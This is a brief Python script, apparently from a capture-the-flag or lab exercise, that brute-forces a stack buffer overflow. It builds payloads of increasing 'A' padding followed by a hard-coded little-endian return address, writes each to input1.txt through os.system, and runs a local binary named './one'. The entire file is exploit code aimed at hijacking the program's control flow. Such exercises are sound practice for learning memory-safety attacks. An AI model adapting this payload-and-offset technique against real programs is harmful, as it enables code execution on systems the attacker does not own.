import os, time

for i in range(0,30):
	print (f"AMount of A: {i}*4")
	a = "AAAA"*i + "\xcd\x62\x55\x56"
	os.system(f"echo 'hehe {a}' > input1.txt")
	os.system("./one")
	
# a = "AAAA"*3 + "\xcd\x62\x55\x56"

# os.system(f"echo 'hehe {a}' > input1.txt")
# # os.system("./a.out")

